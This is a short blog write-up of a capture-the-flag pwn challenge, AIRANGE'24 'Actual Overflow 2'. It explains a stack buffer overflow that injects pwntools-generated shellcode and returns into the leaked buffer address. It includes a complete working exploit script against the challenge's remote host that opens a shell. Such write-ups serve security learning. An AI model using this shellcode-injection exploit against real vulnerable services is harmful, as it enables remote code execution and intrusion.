---
type: Blog
title: AIRANGE'24 - Pwn - Actual Overflow 2
date: '2024-04-16'
tags: ['ctf', 'pwn', 'airange', 'writeup', 'pwntools', 'overflow']
draft: false
summary: It was my first proper buffer over challenge that i solved
---

## Challenge Description

What can you do if I don't give you a function for the flag?

[Download](https://airange.online/files/94259d51f0eb9b7ab3bf3fb3b26c6df9/actual_overflow_2.tar?token=eyJ1c2VyX2lkIjo0NSwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MzN9.Zh_R0Q.aOTL_0aXqSOi7O7Knx6XpKiSXhQ)

## Solution

In the code it can be seen that there is no flag function but rather a function that just prints the string that we enter.

so for this challenge we have to return to shell code so that we can extract the flag.txt,

This can be done by overflowing the buffer and sending the address of buffer that stores input, but with a slight twist that instead of sending just a value or a byte we will inject the shell code in the start of buffer overflow so the next the address that we send after buffer overflow it will redirect to the same buffer again but this time it will execute the shell code. just run the command “**cat flag.txt**”

***you can find the shell code online (but send it as little endian format) as well but the good practice is to use the pwn tools for this you have to give context of the architecture and just use this line it will create a shell code for you***

```python
# context of the ***architecture*** 
context.arch='x86_64'
# function to create shell code.
some variable = asm(shellcraft.sh())
```

**EXPLOIT:**

```python
from pwn import *
context.arch='x86_64'
io = remote("143.198.227.172", 32777)

io.recvuntil(b"u: ")

leak = int(io.recvline().strip(), 16)

print("Leaked address:", hex(leak))

shellcode = asm(shellcraft.sh())

padding = b"A" * (264 - len(shellcode)) 

payload = shellcode + padding + p64(leak)

io.sendline(payload)

io.interactive()
```
![Screenshot](/static/writeups/overflow2/1.png)